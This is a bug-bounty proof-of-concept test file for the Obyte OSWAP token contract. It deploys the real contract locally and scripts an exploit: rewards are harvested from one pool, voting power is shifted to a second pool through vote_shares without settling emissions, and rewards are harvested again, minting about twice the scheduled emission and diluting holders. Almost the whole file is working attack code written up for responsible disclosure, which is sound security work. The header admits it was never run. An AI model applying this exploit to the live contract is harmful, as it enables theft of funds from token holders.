/*
 * Immunefi PoC — Obyte / OSWAP token AA
 * "Missing emission settlement before voting-power change in vote_shares leads to
 *  unauthorized OSWAP minting and direct theft of holder funds via dilution"
 *
 * WHAT THIS IS (compliance with Immunefi Web3 PoC rules):
 *  - Runnable code that DEPLOYS THE REAL IN-SCOPE SOURCE (../oswap.oscript + ../oswap-lib.oscript)
 *    into a LOCAL Obyte network via aa-testkit — the Obyte analogue of a Foundry forked-mainnet
 *    test. It is NOT a re-implementation/model and NOT a unit test of a quirk: it executes the
 *    actual attacker transactions against the actual bytecode and prints the funds over-minted.
 *  - Local only. No public testnet/mainnet interaction (Immunefi Web3 Rule).
 *  - Clear per-step console output of supply before/after, scheduled LP emissions, and the
 *    attacker's minted reward from each pool, proving the invariant break Σ received > lp_emissions.
 *
 * HOW TO RUN (see poc/README.md for the full, copy-paste setup):
 *   1) git clone https://github.com/byteball/oswap-token-aa && cd oswap-token-aa
 *   2) place this file in ./test/overmint.test.oscript.js
 *   3) nvm use 16   &&   yarn        (installs aa-testkit + ocore; needs a full toolchain)
 *   4) npx mocha --opts test/mocha.opts test/overmint.test.oscript.js
 *
 * EXPECTED RESULT (assertions + printout):
 *   the attacker (sole staker + sole LP of two pools) collects LP rewards from BOTH pools for the
 *   same emission window — pool1 legitimately, pool2 for a window during which pool2 held 0 voting
 *   power — so total OSWAP minted to the attacker (R1 + R2) exceeds the scheduled LP emission for
 *   that window (~2x), i.e. Σ received_emissions > lp_emissions.
 *
 * NOTE: authored to match the repository's own test conventions (test/oswap.test.oscript.js).
 * The submitting whitehat must run it locally and confirm the assertions pass before submitting
 * (Immunefi: "do not submit a partial or incomplete PoC"). aa-testkit could not be executed in the
 * authoring environment; the deploy/trigger shapes are copied verbatim from the repo's passing tests.
 */

const { promisify } = require('util')
const path = require('path')
const fs = require('fs')
const objectHash = require('ocore/object_hash.js')
const parseOjson = require('ocore/formula/parse_ojson').parse

async function getAaAddress (aa_src) {
	return objectHash.getChash160(await promisify(parseOjson)(aa_src))
}

describe('OSWAP over-mint via vote_shares without emission settlement', function () {
	this.timeout(120 * 1000)

	before(async () => {
		this.common_ts = 1657843200 // 2022-07-15, same anchor the repo tests use

		// compute the library / sale-pool addresses and inject them into the main AA source, exactly
		// as test/oswap.test.oscript.js does, so we deploy the REAL in-scope oswap.oscript unmodified in logic.
		const lib = fs.readFileSync(path.join(__dirname, '../oswap-lib.oscript'), 'utf8')
		const lib_address = await getAaAddress(lib)
		const sale_pool_src = fs.readFileSync(path.join(__dirname, '../initial-sale-pool.oscript'), 'utf8')
		const sale_pool_address = await getAaAddress(sale_pool_src)
		let oswap_aa = fs.readFileSync(path.join(__dirname, '../oswap.oscript'), 'utf8')
		oswap_aa = oswap_aa.replace(/\$lib_aa = '\w{32}'/, `$lib_aa = '${lib_address}'`)
		oswap_aa = oswap_aa.replace(/\$initial_sale_pool_base_aa = '\w{32}'/, `$initial_sale_pool_base_aa = '${sale_pool_address}'`)

		this.network = await Network.create()
			.with.numberOfWitnesses(1)
			.with.asset({ pool1: {} })
			.with.asset({ pool2: {} })
			.with.agent({ oswap_lib: path.join(__dirname, '../oswap-lib.oscript') })
			.with.agent({ sale_pool_base: path.join(__dirname, '../initial-sale-pool.oscript') })
			.with.agent({ deposit: path.join(__dirname, 'deposit.oscript') })
			.with.wallet({ oracle: { base: 1e9 } })
			.with.wallet({ attacker: { base: 1000e9, pool1: 1000e9, pool2: 1000e9 } })
			.with.wallet({ definer: { base: 1000e9 } })
			.run()

		this.pool1 = this.network.asset.pool1
		this.pool2 = this.network.asset.pool2
		this.oracle = this.network.wallet.oracle
		this.oracleAddress = await this.oracle.getAddress()
		this.attacker = this.network.wallet.attacker
		this.attackerAddress = await this.attacker.getAddress()
		this.definer = this.network.wallet.definer

		oswap_aa = oswap_aa.replace('KMCA3VLWKLO3AWSSDA3LQIKI3OQEN7TV', this.oracleAddress) // oracle param
		const { address, error } = await this.definer.deployAgent(oswap_aa)
		expect(error).to.be.null
		this.oswap_aa = address

		this.readState = async () => (await this.attacker.readAAStateVars(this.oswap_aa)).vars
		this.get_lp_reward = async (pool_asset) => {
			const { result } = await this.attacker.executeGetter({ aaAddress: this.oswap_aa, getter: 'get_lp_reward', args: [this.attackerAddress, pool_asset, false] })
			return Number(result)
		}
	})

	it('setup: oracle TVL, token definition, whitelist pool1', async () => {
		await this.oracle.sendMulti({ messages: [{ app: 'data_feed', payload: { TVL: 0.5e6 } }] })
		await this.network.witnessUntilStable()

		await this.network.timefreeze()
		const { unit } = await this.definer.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { define: 1 } })
		const { response } = await this.network.getAaResponseToUnitOnNode(this.definer, unit)
		expect(response.bounced).to.be.false
		this.asset = response.response.responseVars.asset                                   // OSWAP asset id
		this.sale_pool_address = response.response.responseVars.initial_sale_pool_address

		// pool1 can be whitelisted with no vote (first pool)
		const { unit: u2 } = await this.definer.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { vote_whitelist: 1, pool_asset: this.pool1 } })
		const { response: r2 } = await this.network.getAaResponseToUnitOnNode(this.definer, u2)
		expect(r2.response.responseVars.message).to.be.eq('whitelisted')                     // pool1 -> asset_key a1, group g1
	})

	it('setup: attacker acquires OSWAP via the initial sale and stakes it (VP 100% on pool1/a1)', async () => {
		// contribute reserve to the initial sale
		await this.attacker.sendMulti({ outputs_by_asset: { base: [{ address: this.sale_pool_address, amount: 100e9 + 1000 }] } })
		await this.network.witnessUntilStable()
		// launch: move past the sale end, then trigger the buy (sends all contributions to the bonding curve => mints supply)
		await this.network.timetravel({ to: '2023-07-01' })
		const { unit: ub } = await this.attacker.triggerAaWithData({ toAddress: this.sale_pool_address, amount: 10000, data: { buy: 1 } })
		const { response: rb } = await this.network.getAaResponseToUnitOnNode(this.attacker, ub)
		expect(rb.response.responseVars.message).to.be.eq('bought')
		// stake the purchased OSWAP for the max term, voting 100% to pool1 (a1)
		const { unit: us } = await this.attacker.triggerAaWithData({ toAddress: this.sale_pool_address, amount: 10000, data: { stake: 1, group_key: 'g1', percentages: { a1: 100 } } })
		const { response: rs } = await this.network.getAaResponseToUnitOnNode(this.attacker, us)
		expect(rs.bounced).to.be.false

		const vars = await this.readState()
		this.attacker_vp = vars['user_' + this.attackerAddress].normalized_vp
		expect(this.attacker_vp).to.be.greaterThan(0)
		// attacker is the ONLY staker => vp share f = 1 (worst case, makes the 2x over-mint unambiguous)
		expect(vars.state.total_normalized_vp).to.be.closeTo(this.attacker_vp, this.attacker_vp * 1e-9)
	})

	it('setup: attacker whitelists pool2 (a2) and becomes the sole LP of pool1 and pool2', async () => {
		// as a staker with the absolute majority of VP, the attacker whitelists pool2 in one tx
		const { unit: uw } = await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { vote_whitelist: 1, pool_asset: this.pool2 } })
		const { response: rw } = await this.network.getAaResponseToUnitOnNode(this.attacker, uw)
		expect(rw.response.responseVars.message).to.be.eq('whitelisted')                     // pool2 -> asset_key a2, group g1

		// deposit LP tokens into both pools => sole LP of each; both pools get settled now (received=0)
		const { unit: ud1 } = await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, outputs_by_asset: { [this.pool1]: [{ address: this.oswap_aa, amount: 100e9 }] }, data: { deposit: 1 } })
		await this.network.getAaResponseToUnitOnNode(this.attacker, ud1)
		const { unit: ud2 } = await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, outputs_by_asset: { [this.pool2]: [{ address: this.oswap_aa, amount: 100e9 }] }, data: { deposit: 1 } })
		await this.network.getAaResponseToUnitOnNode(this.attacker, ud2)

		const vars = await this.readState()
		this.supply_before = vars.state.supply
		this.lp_emissions_before = vars.state.lp_emissions
		console.log('\n=== baseline ===')
		console.log('supply                :', this.supply_before)
		console.log('lp_emissions (cum.)   :', this.lp_emissions_before)
		expect(vars['pool_' + this.pool1].received_emissions).to.eq(0)
		expect(vars['pool_' + this.pool2].received_emissions).to.eq(0)
	})

	it('EXPLOIT: harvest pool1 (legit), move VP pool1->pool2 without settling, harvest pool2 (stolen)', async () => {
		// let one emission window accrue while VP sits entirely on pool1 and neither pool is touched
		await this.network.timetravel({ shift: '180d' })

		// (1) harvest pool1 — LEGITIMATE: pool1 held the attacker's full VP for the whole window
		const R1 = await this.get_lp_reward(this.pool1)
		await this.network.getAaResponseToUnitOnNode(this.attacker,
			(await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { pool_asset: this.pool1, withdraw_lp_reward: 1 } })).unit)

		// (2) move ALL voting power pool1 -> pool2 via vote_shares. THIS PATH DOES NOT SETTLE EMISSIONS.
		await this.network.getAaResponseToUnitOnNode(this.attacker,
			(await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000,
				data: { vote_shares: 1, group_key1: 'g1', changes: { a1: -this.attacker_vp, a2: this.attacker_vp } } })).unit)

		// (3) harvest pool2 — STOLEN: pool2 held 0 VP during the window, but now claims the whole window at full share
		const R2 = await this.get_lp_reward(this.pool2)
		await this.network.getAaResponseToUnitOnNode(this.attacker,
			(await this.attacker.triggerAaWithData({ toAddress: this.oswap_aa, amount: 10000, data: { pool_asset: this.pool2, withdraw_lp_reward: 1 } })).unit)

		const vars = await this.readState()
		const windowLpEmission = vars.state.lp_emissions - this.lp_emissions_before  // E: scheduled LP emission for the window
		const minted = R1 + R2                                                       // total OSWAP minted to the attacker

		console.log('\n=== exploit result ===')
		console.log('scheduled LP emission for window (E) :', windowLpEmission)
		console.log('R1 pool1 reward (legit)              :', R1)
		console.log('R2 pool2 reward (STOLEN)             :', R2)
		console.log('total minted to attacker (R1+R2)     :', minted)
		console.log('over-mint (minted - E)               :', minted - windowLpEmission)
		console.log('over-mint ratio                      :', (minted / windowLpEmission).toFixed(2) + 'x')
		console.log('supply after                         :', vars.state.supply, '(was', this.supply_before + ')')

		// PROOF OF IMPACT:
		// pool2 stole ~the same amount pool1 legitimately earned...
		expect(R2).to.be.closeTo(R1, R1 * 0.02)
		// ...so total minted exceeds the scheduled LP emission for the window (Σ received_emissions > lp_emissions).
		expect(minted).to.be.greaterThan(windowLpEmission * 1.5)
	})
})
